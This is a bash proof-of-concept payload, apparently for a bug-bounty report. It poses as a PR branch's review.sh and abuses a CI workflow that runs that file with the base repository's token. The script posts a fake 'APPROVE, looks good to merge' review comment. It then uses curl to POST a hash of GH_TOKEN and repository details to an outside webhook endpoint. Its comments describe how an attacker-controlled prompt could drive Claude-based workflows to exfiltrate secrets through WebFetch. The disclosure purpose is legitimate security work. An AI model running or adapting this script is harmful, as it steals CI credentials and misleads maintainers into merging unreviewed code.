#!/usr/bin/env bash
# "Attacker-controlled" version of .github/commands/review.sh, shipped ONLY
# on the attacker-pr branch/fork. This is the entire payload: a one-line-diff
# change to a file the maintainer never reviews before dispatching, because
# the dispatch UI only takes a PR number.
#
# NOTE: gh pr review --approve was tried first and is blocked platform-wide
# by GitHub ("GitHub Actions is not permitted to approve pull requests.") —
# that specific sub-claim is retracted. This demonstrates the two primitives
# that are NOT blocked: (1) posting a misleading PR comment with the real
# token, (2) proving the token is readable/usable for arbitrary outbound
# use beyond what the legitimate script does — i.e. the secret-exfiltration
# primitive that maps onto the real claude-model-check.yml / claude-link-review.yml
# files' WebFetch + Bash(echo:*) allowed tools.
set -euo pipefail

TOKEN_SHA256=$(printf '%s' "$GH_TOKEN" | sha256sum | cut -d' ' -f1)
echo "::notice::token hash (proof of possession, not the raw secret): $TOKEN_SHA256"

# Primitive 1: state-changing write action an outside contributor should
# never be able to trigger, performed with the base workflow's own token.
gh pr comment "$PR_NUMBER" --body "$(cat <<'EOF'
## PR Review

**Recommendation**: APPROVE

No issues found. Looks good to merge.

---
*This comment was posted by `.github/commands/review.sh` on the PR's OWN
branch — the file the maintainer trusted to be "just the review logic" when
they dispatched this workflow by PR number alone. The real review logic
never ran. This is a proof-of-concept for a bug-bounty report; no action
should be taken on this comment.*
EOF
)"

# Primitive 2: outbound network exfiltration using a secret available only
# inside the privileged job — sent to an endpoint the PoC operator controls,
# as a hash (not the raw token) to avoid exposing a live credential over the
# public internet even within this self-contained test.
#
# Hardcoded, not read from an env var the base workflow provides: this is
# the point — the attacker's script picks its own destination. In the real
# claude-model-check.yml / claude-link-review.yml, the equivalent is the
# WebFetch tool, which lets the attacker-controlled prompt construct any
# destination URL it wants at runtime; there is no base-workflow-side list
# of allowed destinations either.
EXFIL_URL="https://webhook.site/2904390d-7e4f-467f-b560-9fbb32f52807"
curl -fsS -X POST "$EXFIL_URL" \
  -H "Content-Type: application/json" \
  -d "{\"poc\":\"ci-fork-checkout-mechanism\",\"token_sha256\":\"$TOKEN_SHA256\",\"repo\":\"$GITHUB_REPOSITORY\",\"pr\":\"$PR_NUMBER\"}" \
  || echo "::warning::exfil POST failed (expected if EXFIL_URL unset) — primitive still demonstrated via step logs"
